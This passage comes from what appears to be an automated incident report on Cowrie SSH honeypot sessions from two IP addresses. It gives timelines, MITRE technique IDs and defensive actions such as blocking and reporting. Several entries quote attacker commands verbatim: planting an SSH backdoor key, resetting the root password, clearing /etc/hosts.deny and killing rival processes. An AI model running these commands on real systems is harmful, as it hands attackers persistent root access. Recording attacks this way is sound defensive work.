| `2026-04-24 21:47:31` | `cowrie.login.success` |
| `2026-04-24 21:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.58.136[.]133` to AbuseIPDB if not already reported
- [ ] Block `37.58.136[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-751a4f7b5baf

| Field | Detail |
|---|---|
| **Source IP** | `37.58.136[.]133` |
| **First Seen** | 2026-04-24 21:47 |
| **Last Seen** | 2026-04-24 21:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:47:53` | `cowrie.session.connect` |
| `2026-04-24 21:47:53` | `cowrie.client.version` |
| `2026-04-24 21:47:53` | `cowrie.client.kex` |
| `2026-04-24 21:47:54` | `cowrie.login.success` |
| `2026-04-24 21:47:54` | `cowrie.session.params` |
| `2026-04-24 21:47:54` | `cowrie.command.input` |
| `2026-04-24 21:47:54` | `cowrie.command.failed` |
| `2026-04-24 21:47:55` | `cowrie.log.closed` |
| `2026-04-24 21:47:55` | `cowrie.session.params` |
| `2026-04-24 21:47:55` | `cowrie.command.input` |
| `2026-04-24 21:47:55` | `cowrie.session.file_download` |
| `2026-04-24 21:47:55` | `cowrie.log.closed` |
| `2026-04-24 21:47:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.58.136[.]133` to AbuseIPDB if not already reported
- [ ] Block `37.58.136[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af958825f54d

| Field | Detail |
|---|---|
| **Source IP** | `37.58.136[.]133` |
| **First Seen** | 2026-04-24 21:47 |
| **Last Seen** | 2026-04-24 21:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:47:57` | `cowrie.session.connect` |
| `2026-04-24 21:47:57` | `cowrie.client.version` |
| `2026-04-24 21:47:57` | `cowrie.client.kex` |
| `2026-04-24 21:47:58` | `cowrie.login.success` |
| `2026-04-24 21:47:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.58.136[.]133` to AbuseIPDB if not already reported
- [ ] Block `37.58.136[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-938e565050d7

| Field | Detail |
|---|---|
| **Source IP** | `37.58.136[.]133` |
| **First Seen** | 2026-04-24 21:48 |
| **Last Seen** | 2026-04-24 21:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:48:07` | `cowrie.session.connect` |
| `2026-04-24 21:48:07` | `cowrie.client.version` |
| `2026-04-24 21:48:07` | `cowrie.client.kex` |
| `2026-04-24 21:48:07` | `cowrie.login.success` |
| `2026-04-24 21:48:08` | `cowrie.session.params` |
| `2026-04-24 21:48:08` | `cowrie.command.input` |
| `2026-04-24 21:48:08` | `cowrie.command.failed` |
| `2026-04-24 21:48:08` | `cowrie.log.closed` |
| `2026-04-24 21:48:08` | `cowrie.session.params` |
| `2026-04-24 21:48:08` | `cowrie.command.input` |
| `2026-04-24 21:48:08` | `cowrie.session.file_download` |
| `2026-04-24 21:48:08` | `cowrie.log.closed` |
| `2026-04-24 21:48:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.58.136[.]133` to AbuseIPDB if not already reported
- [ ] Block `37.58.136[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4c34080de25

| Field | Detail |
|---|---|
| **Source IP** | `37.58.136[.]133` |
| **First Seen** | 2026-04-24 21:48 |
| **Last Seen** | 2026-04-24 21:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:48:11` | `cowrie.session.connect` |
| `2026-04-24 21:48:11` | `cowrie.client.version` |
| `2026-04-24 21:48:11` | `cowrie.client.kex` |
| `2026-04-24 21:48:11` | `cowrie.login.success` |
| `2026-04-24 21:48:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.58.136[.]133` to AbuseIPDB if not already reported
- [ ] Block `37.58.136[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48a1c621d729

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:10 |
| **Last Seen** | 2026-04-24 22:11 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:RVTUPQWRI6kJ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:10:39` | `cowrie.session.connect` |
| `2026-04-24 22:10:39` | `cowrie.client.version` |
| `2026-04-24 22:10:40` | `cowrie.client.kex` |
| `2026-04-24 22:10:40` | `cowrie.login.success` |
| `2026-04-24 22:10:41` | `cowrie.session.params` |
| `2026-04-24 22:10:41` | `cowrie.command.input` |
| `2026-04-24 22:10:41` | `cowrie.command.failed` |
| `2026-04-24 22:10:41` | `cowrie.log.closed` |
| `2026-04-24 22:10:41` | `cowrie.session.params` |
| `2026-04-24 22:10:41` | `cowrie.command.input` |
| `2026-04-24 22:10:41` | `cowrie.session.file_download` |
| `2026-04-24 22:10:41` | `cowrie.log.closed` |
| `2026-04-24 22:10:54` | `cowrie.session.params` |
| `2026-04-24 22:10:54` | `cowrie.command.input` |
| `2026-04-24 22:10:54` | `cowrie.log.closed` |
| `2026-04-24 22:10:54` | `cowrie.session.params` |
| `2026-04-24 22:10:54` | `cowrie.command.input` |
| `2026-04-24 22:10:54` | `cowrie.log.closed` |
| `2026-04-24 22:10:55` | `cowrie.session.params` |
| `2026-04-24 22:10:55` | `cowrie.command.input` |
| `2026-04-24 22:10:55` | `cowrie.session.file_download` |
| `2026-04-24 22:10:55` | `cowrie.log.closed` |
| `2026-04-24 22:10:55` | `cowrie.session.params` |
| `2026-04-24 22:10:55` | `cowrie.command.input` |
| `2026-04-24 22:10:55` | `cowrie.log.closed` |
| `2026-04-24 22:10:56` | `cowrie.session.params` |
| `2026-04-24 22:10:56` | `cowrie.command.input` |
| `2026-04-24 22:10:56` | `cowrie.log.closed` |
| `2026-04-24 22:10:56` | `cowrie.session.params` |
| `2026-04-24 22:10:56` | `cowrie.command.input` |
| `2026-04-24 22:10:56` | `cowrie.command.input` |
| `2026-04-24 22:10:56` | `cowrie.log.closed` |
| `2026-04-24 22:10:57` | `cowrie.session.params` |
| `2026-04-24 22:10:57` | `cowrie.command.input` |
| `2026-04-24 22:10:57` | `cowrie.log.closed` |
| `2026-04-24 22:10:57` | `cowrie.session.params` |
| `2026-04-24 22:10:57` | `cowrie.command.input` |
| `2026-04-24 22:10:57` | `cowrie.log.closed` |
| `2026-04-24 22:10:58` | `cowrie.session.params` |
| `2026-04-24 22:10:58` | `cowrie.command.input` |
| `2026-04-24 22:10:58` | `cowrie.log.closed` |
| `2026-04-24 22:10:58` | `cowrie.session.params` |
| `2026-04-24 22:10:58` | `cowrie.command.input` |
| `2026-04-24 22:10:58` | `cowrie.log.closed` |
| `2026-04-24 22:10:59` | `cowrie.session.params` |
| `2026-04-24 22:10:59` | `cowrie.command.input` |
| `2026-04-24 22:10:59` | `cowrie.log.closed` |
| `2026-04-24 22:10:59` | `cowrie.session.params` |
| `2026-04-24 22:10:59` | `cowrie.command.input` |
| `2026-04-24 22:10:59` | `cowrie.log.closed` |
| `2026-04-24 22:11:00` | `cowrie.session.params` |
| `2026-04-24 22:11:00` | `cowrie.command.input` |
| `2026-04-24 22:11:00` | `cowrie.log.closed` |
| `2026-04-24 22:11:00` | `cowrie.session.params` |
| `2026-04-24 22:11:00` | `cowrie.command.input` |
| `2026-04-24 22:11:00` | `cowrie.log.closed` |
| `2026-04-24 22:11:01` | `cowrie.session.params` |
| `2026-04-24 22:11:01` | `cowrie.command.input` |
| `2026-04-24 22:11:01` | `cowrie.log.closed` |
| `2026-04-24 22:11:01` | `cowrie.session.params` |
| `2026-04-24 22:11:01` | `cowrie.command.input` |
| `2026-04-24 22:11:02` | `cowrie.log.closed` |
| `2026-04-24 22:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5b5344a09b6

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:11 |
| **Last Seen** | 2026-04-24 22:11 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:3b45B6qzy7nk"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:11:04` | `cowrie.session.connect` |
| `2026-04-24 22:11:04` | `cowrie.client.version` |
| `2026-04-24 22:11:04` | `cowrie.client.kex` |
| `2026-04-24 22:11:05` | `cowrie.login.success` |
| `2026-04-24 22:11:05` | `cowrie.session.params` |
| `2026-04-24 22:11:05` | `cowrie.command.input` |
| `2026-04-24 22:11:05` | `cowrie.command.failed` |
| `2026-04-24 22:11:05` | `cowrie.log.closed` |
| `2026-04-24 22:11:06` | `cowrie.session.params` |
| `2026-04-24 22:11:06` | `cowrie.command.input` |
| `2026-04-24 22:11:06` | `cowrie.session.file_download` |
| `2026-04-24 22:11:06` | `cowrie.log.closed` |
| `2026-04-24 22:11:18` | `cowrie.session.params` |
| `2026-04-24 22:11:18` | `cowrie.command.input` |
| `2026-04-24 22:11:18` | `cowrie.log.closed` |
| `2026-04-24 22:11:19` | `cowrie.session.params` |
| `2026-04-24 22:11:19` | `cowrie.command.input` |
| `2026-04-24 22:11:19` | `cowrie.log.closed` |
| `2026-04-24 22:11:19` | `cowrie.session.params` |
| `2026-04-24 22:11:19` | `cowrie.command.input` |
| `2026-04-24 22:11:19` | `cowrie.session.file_download` |
| `2026-04-24 22:11:19` | `cowrie.log.closed` |
| `2026-04-24 22:11:20` | `cowrie.session.params` |
| `2026-04-24 22:11:20` | `cowrie.command.input` |
| `2026-04-24 22:11:20` | `cowrie.log.closed` |
| `2026-04-24 22:11:20` | `cowrie.session.params` |
| `2026-04-24 22:11:20` | `cowrie.command.input` |
| `2026-04-24 22:11:20` | `cowrie.log.closed` |
| `2026-04-24 22:11:21` | `cowrie.session.params` |
| `2026-04-24 22:11:21` | `cowrie.command.input` |
| `2026-04-24 22:11:21` | `cowrie.command.input` |
| `2026-04-24 22:11:21` | `cowrie.log.closed` |
| `2026-04-24 22:11:21` | `cowrie.session.params` |
| `2026-04-24 22:11:21` | `cowrie.command.input` |
| `2026-04-24 22:11:21` | `cowrie.log.closed` |
| `2026-04-24 22:11:22` | `cowrie.session.params` |
| `2026-04-24 22:11:22` | `cowrie.command.input` |
| `2026-04-24 22:11:22` | `cowrie.log.closed` |
| `2026-04-24 22:11:22` | `cowrie.session.params` |
| `2026-04-24 22:11:22` | `cowrie.command.input` |
| `2026-04-24 22:11:22` | `cowrie.log.closed` |
| `2026-04-24 22:11:23` | `cowrie.session.params` |
| `2026-04-24 22:11:23` | `cowrie.command.input` |
| `2026-04-24 22:11:23` | `cowrie.log.closed` |
| `2026-04-24 22:11:23` | `cowrie.session.params` |
| `2026-04-24 22:11:23` | `cowrie.command.input` |
| `2026-04-24 22:11:23` | `cowrie.log.closed` |
| `2026-04-24 22:11:24` | `cowrie.session.params` |
| `2026-04-24 22:11:24` | `cowrie.command.input` |
| `2026-04-24 22:11:24` | `cowrie.log.closed` |
| `2026-04-24 22:11:24` | `cowrie.session.params` |
| `2026-04-24 22:11:24` | `cowrie.command.input` |
| `2026-04-24 22:11:24` | `cowrie.log.closed` |
| `2026-04-24 22:11:25` | `cowrie.session.params` |
| `2026-04-24 22:11:25` | `cowrie.command.input` |
| `2026-04-24 22:11:25` | `cowrie.log.closed` |
| `2026-04-24 22:11:25` | `cowrie.session.params` |
| `2026-04-24 22:11:25` | `cowrie.command.input` |
| `2026-04-24 22:11:25` | `cowrie.log.closed` |
| `2026-04-24 22:11:26` | `cowrie.session.params` |
| `2026-04-24 22:11:26` | `cowrie.command.input` |
| `2026-04-24 22:11:26` | `cowrie.log.closed` |
| `2026-04-24 22:11:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b96100d3e3d2

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:12 |
| **Last Seen** | 2026-04-24 22:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:12:05` | `cowrie.session.connect` |
| `2026-04-24 22:12:05` | `cowrie.client.version` |
| `2026-04-24 22:12:06` | `cowrie.client.kex` |
| `2026-04-24 22:12:09` | `cowrie.login.success` |
| `2026-04-24 22:12:09` | `cowrie.session.params` |
| `2026-04-24 22:12:09` | `cowrie.command.input` |
| `2026-04-24 22:12:09` | `cowrie.command.failed` |
| `2026-04-24 22:12:09` | `cowrie.log.closed` |
| `2026-04-24 22:12:10` | `cowrie.session.params` |
| `2026-04-24 22:12:10` | `cowrie.command.input` |
| `2026-04-24 22:12:10` | `cowrie.session.file_download` |
| `2026-04-24 22:12:10` | `cowrie.log.closed` |
| `2026-04-24 22:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c66fa2d83ce

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:12 |
| **Last Seen** | 2026-04-24 22:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:12:14` | `cowrie.session.connect` |
| `2026-04-24 22:12:14` | `cowrie.client.version` |
| `2026-04-24 22:12:14` | `cowrie.client.kex` |
| `2026-04-24 22:12:15` | `cowrie.login.success` |
| `2026-04-24 22:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18555179b3b5

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:12 |
| **Last Seen** | 2026-04-24 22:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:12:19` | `cowrie.session.connect` |
| `2026-04-24 22:12:19` | `cowrie.client.version` |
| `2026-04-24 22:12:19` | `cowrie.client.kex` |
| `2026-04-24 22:12:20` | `cowrie.login.success` |
| `2026-04-24 22:12:20` | `cowrie.session.params` |
| `2026-04-24 22:12:20` | `cowrie.command.input` |
| `2026-04-24 22:12:20` | `cowrie.command.failed` |
| `2026-04-24 22:12:21` | `cowrie.log.closed` |
| `2026-04-24 22:12:21` | `cowrie.session.params` |
| `2026-04-24 22:12:21` | `cowrie.command.input` |
| `2026-04-24 22:12:21` | `cowrie.session.file_download` |
| `2026-04-24 22:12:21` | `cowrie.log.closed` |
| `2026-04-24 22:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9afd877bcf95

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:12 |
| **Last Seen** | 2026-04-24 22:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:12:23` | `cowrie.session.connect` |
| `2026-04-24 22:12:23` | `cowrie.client.version` |
| `2026-04-24 22:12:23` | `cowrie.client.kex` |
| `2026-04-24 22:12:24` | `cowrie.login.success` |
| `2026-04-24 22:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14856f8ce198

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:12 |
| **Last Seen** | 2026-04-24 22:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:12:30` | `cowrie.session.connect` |
| `2026-04-24 22:12:30` | `cowrie.client.version` |
| `2026-04-24 22:12:30` | `cowrie.client.kex` |
| `2026-04-24 22:12:30` | `cowrie.login.success` |
| `2026-04-24 22:12:31` | `cowrie.session.params` |
| `2026-04-24 22:12:31` | `cowrie.command.input` |
| `2026-04-24 22:12:31` | `cowrie.command.failed` |
| `2026-04-24 22:12:31` | `cowrie.log.closed` |
| `2026-04-24 22:12:31` | `cowrie.session.params` |
| `2026-04-24 22:12:31` | `cowrie.command.input` |
| `2026-04-24 22:12:32` | `cowrie.session.file_download` |
| `2026-04-24 22:12:32` | `cowrie.log.closed` |
| `2026-04-24 22:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26df8cf9ecc3

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-04-24 22:12 |
| **Last Seen** | 2026-04-24 22:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:12:34` | `cowrie.session.connect` |
| `2026-04-24 22:12:34` | `cowrie.client.version` |
| `2026-04-24 22:12:34` | `cowrie.client.kex` |
| `2026-04-24 22:12:35` | `cowrie.login.success` |
| `2026-04-24 22:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f761e042522

